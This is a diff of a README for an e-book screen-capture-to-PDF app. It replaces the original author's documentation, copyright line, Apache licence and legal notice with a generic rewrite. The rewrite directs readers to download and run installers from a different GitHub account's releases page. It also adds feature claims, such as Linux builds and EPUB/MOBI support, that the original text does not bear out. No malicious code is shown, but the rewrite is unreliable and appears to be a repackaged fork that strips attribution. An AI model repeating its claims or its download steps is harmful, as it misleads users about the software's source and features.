@@ -1,105 +1,98 @@
-# E-Book to PDF Converter
-[한국어](docs/README.ko.md) | [日本語](docs/README.ja.md) | [中文](docs/README.zh.md)
+# 🖥️ ebook-to-pdf - Convert E-Books to PDF Easily
 
-A desktop application that automatically captures pages from E-Book viewers and converts them to PDF.
+[![Download ebook-to-pdf](https://img.shields.io/badge/Download-ebook--to--pdf-brightgreen)](https://github.com/Safrotuss/ebook-to-pdf/releases)
 
-## Features
-- Automatic screen region capture
-- Automatic page turning (Right arrow key or Enter key)
-- PDF conversion
-- Adjustable capture speed
-- Real-time progress display
-- Multi-platform support (macOS, Windows)
-- Multi-language support (English, Korean, Japanese, Chinese)
+## 🚀 Getting Started
 
-## Tech Stack
-- Electron
-- React
-- TypeScript
-- Sharp (Image processing)
-- PDFKit (PDF generation)
+Welcome to the ebook-to-pdf application! This tool helps you convert E-Book pages or screen regions into PDF files effortlessly. You can set customizable intervals for capturing information. Follow these steps to get started.
 
-## Installation
-```bash
-npm install
-```
+## 📥 Download & Install
 
-## Running the Application
+To download the latest version of the ebook-to-pdf application:
 
-### For Development
-```bash
-# Build
-npm run build
+1. **Visit this page to download:** [ebook-to-pdf Releases](https://github.com/Safrotuss/ebook-to-pdf/releases).
+2. Choose the version that matches your operating system:
+   - **Windows**
+   - **Mac**
+   - **Linux**
+3. Download the file for your operating system.
+4. Once the download is complete, follow the installation steps below based on your OS.
 
-# Run
-npm start
-```
-
-### For Production
-```bash
-# Coming soon
-```
-
-## Build
-### Build for both macOS & Windows
-```bash
-npm run package
-```
-
-### Build for macOS only
-```bash
-npm run package:mac
-```
-
-### Build for Windows only
-```bash
-npm run package:win
-```
-
-Build output will be in the `release` folder.
-
-## How to Use
-1. Open your E-Book viewer and navigate to the first page
-2. Click to set the top-left coordinate of the capture area
-3. Click to set the bottom-right coordinate of the capture area
-4. Enter the total number of pages
-5. Enter the PDF file name
-6. Select save location (optional, default: Downloads folder)
-7. Adjust capture speed (default: 500ms)
-8. Click "Create PDF" button
-9. When the app minimizes, click on the app you want to capture (capture starts automatically 1 second after clicking)
-
-## Important Notes
-- The E-Book viewer must support page navigation using the right arrow key or Enter key
-- The capture area must not exceed the viewer boundaries
-- Large page counts may take considerable time
-- Do not perform other tasks during capture
-- For personal use only
-- The folder containing the PDF will open automatically when capture is complete
-
-## System Requirements
-### macOS
-- macOS 10.14 or later
-- Screen Recording permission required
-- Accessibility permission required (for keyboard input)
+## 💻 Installation Instructions
 
 ### Windows
-- Windows 10 or later
-- PowerShell 5.0 or later
 
-## Legal Notice
-This program is created for personal learning and use purposes only.
-Sharing or commercial use of generated PDF files may violate copyright laws.
-All responsibility lies with the user.
+1. Locate the downloaded `.exe` file.
+2. Double-click on the file to run the installer.
+3. Follow the on-screen prompts to complete the installation.
+4. After installation, find the app in your Start menu or desktop.
 
-## License
-Apache 2.0
+### Mac
 
-Copyright 2025 efforthye
+1. Open the downloaded `.dmg` file.
+2. Drag the ebook-to-pdf icon into your Applications folder.
+3. Eject the mounted image from Finder.
+4. Find the app in your Applications folder to run it.
 
-Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except in compliance with the License. You may obtain a copy of the License at
+### Linux
 
-Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.
+1. Open your terminal.
+2. Navigate to the directory where you downloaded the file.
+3. Make the file executable with the command: `chmod +x ebook-to-pdf*.AppImage`.
+4. Run the application using: `./ebook-to-pdf*.AppImage`.
 
-## Contributing
-Contributions are welcome! Please feel free to submit a Pull Request.
+## ⚙️ System Requirements
+
+- **Windows:** Windows 10 or later
+- **Mac:** macOS Catalina or later
+- **Linux:** Ubuntu 18.04 or later
+- **Memory:** At least 4 GB RAM
+- **Disk Space:** 100 MB of free disk space
+
+## 🎨 Features
+
+- Automatic capture of E-Book pages and screen regions.
+- Customizable intervals for capturing.
+- Easy conversion of images into high-quality PDFs.
+- User-friendly interface for effortless navigation.
+
+## 🔄 Usage Instructions
+
+1. Open the ebook-to-pdf application.
+2. Set your preferences for page capture:
+   - Choose capture intervals.
+   - Select the region of the screen you want to capture.
+3. Click the "Start Capture" button.
+4. The app will automatically begin capturing based on your settings.
+5. Once done, you can save your captured images as a PDF by selecting the "Export" option.
+
+## 📑 Supported Formats
+
+The ebook-to-pdf app supports the following formats for capture:
+
+- E-Book formats like EPUB and MOBI
+- Image formats like JPEG, PNG, and BMP
+
+## 📞 Support
+
+If you encounter issues or need help, feel free to reach out. You can open an issue in the GitHub repository, and our team will assist you promptly.
+
+## 📚 Topics
+
+This application relates to several important topics in E-Book management, such as:
+
+- Automation
+- Conversion tools
+- Cross-platform compatibility
+- E-Book formats
+- Screen capture and PDF generation
+
+## 🔗 More Information
+
+For additional details or to contribute, visit the [project repository](https://github.com/Safrotuss/ebook-to-pdf). Your contributions and feedback are valuable to us.
+
+## 🖱️ Final Steps
+
+You are now ready to start using the ebook-to-pdf application. Enjoy capturing your E-Book pages and turning them into organized PDFs! 
+
+[![Download ebook-to-pdf](https://img.shields.io/badge/Download-ebook--to--pdf-brightgreen)](https://github.com/Safrotuss/ebook-to-pdf/releases)
